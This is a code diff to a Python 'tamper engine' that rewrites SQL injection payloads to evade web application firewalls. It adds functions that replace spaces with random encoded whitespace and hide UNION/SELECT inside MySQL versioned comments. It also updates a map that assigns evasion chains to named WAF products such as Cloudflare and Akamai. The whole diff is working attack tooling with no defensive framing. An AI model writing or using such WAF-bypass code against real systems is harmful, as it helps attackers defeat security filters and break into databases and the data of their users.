@@ -6,6 +6,7 @@ This module contains a collection of functions to modify SQLi payloads
 in order to bypass web application firewalls.
 """
 import random
+import re
 from urllib.parse import quote_plus
 
 def space_to_comment(payload: str) -> str:
@@ -30,6 +31,23 @@ def equal_to_like(payload: str) -> str:
     """Replaces all instances of '=' with ' LIKE '."""
     return payload.replace("=", " LIKE ")
 
+def space_to_random_blank(payload: str) -> str:
+    """Replaces space characters with random whitespace characters."""
+    whitespace = ['%09', '%0a', '%0b', '%0c', '%0d']
+    ret_val = ""
+    for char in payload:
+        if char == ' ':
+            ret_val += random.choice(whitespace)
+        else:
+            ret_val += char
+    return ret_val
+
+def versioned_keywords(payload: str) -> str:
+    """Wraps keywords in MySQL versioned comments."""
+    # A simple implementation focusing on common keywords
+    payload = re.sub(r'(?i)\b(UNION|SELECT)\b', r'/*!50000\1*/', payload)
+    return payload
+
 # A dictionary to map tamper script names to their respective functions.
 # This makes the tamper engine easily extensible.
 TAMPER_FUNCTIONS = {
@@ -38,6 +56,8 @@ TAMPER_FUNCTIONS = {
     'urlencode': plus_url_encode,
     'chardoubleencode': char_double_encode,
     'equaltolike': equal_to_like,
+    'space2randomblank': space_to_random_blank,
+    'versionedkeywords': versioned_keywords,
 }
 
 def apply_tampers(payload: str, tamper_list: list[str]) -> str:
@@ -60,9 +80,9 @@ def apply_tampers(payload: str, tamper_list: list[str]) -> str:
 # A mapping of known WAFs to a suggested list of tamper scripts for bypassing them.
 # This provides the "adaptive" logic for the tamper engine.
 WAF_TAMPER_MAP = {
-    "Cloudflare": ["space2comment", "randomcase"],
+    "Cloudflare": ["space2randomblank", "versionedkeywords", "randomcase"],
     "Sucuri": ["urlencode", "space2comment"],
-    "Akamai": ["randomcase"],
+    "Akamai": ["randomcase", "space2comment"],
     "Imperva": ["urlencode"],
     "Generic": ["space2comment"]  # Default for unknown or undetected WAFs
 }
